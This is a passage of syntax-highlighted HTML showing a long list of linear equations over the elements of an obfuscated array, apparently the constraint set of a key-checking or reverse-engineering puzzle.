number">7975</span><span class="token punctuation">,</span>
         <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">55</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">229</span><span class="token punctuation">,</span>
         <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2107</span><span class="token punctuation">,</span>
         <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">30</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">4037</span><span class="token punctuation">,</span>
         <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">56</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">122</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">4950</span><span class="token punctuation">,</span>
         <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">33</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">12544</span><span class="token punctuation">,</span>
         <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">25</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6585</span><span class="token punctuation">,</span>
         <span class="token number">223</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">53</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">18</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6893</span><span class="token punctuation">,</span>
         <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">93</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">36</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">68</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">14</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1883</span><span class="token punctuation">,</span>
         <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">77</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">93</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">19</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">38</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">8257</span><span class="token punctuation">,</span>
         <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">18</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">5847</span><span class="token punctuation">,</span>
         <span class="token number">24</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">146</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">50</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">27</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">45</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">17</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">18257</span><span class="token punctuation">,</span>
         <span class="token number">25</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">89</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">19</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">150</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">250</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">166</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">126</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">690</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">207</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">18</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">12591</span><span class="token punctuation">,</span>
         <span class="token number">5</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">160</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">690</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token 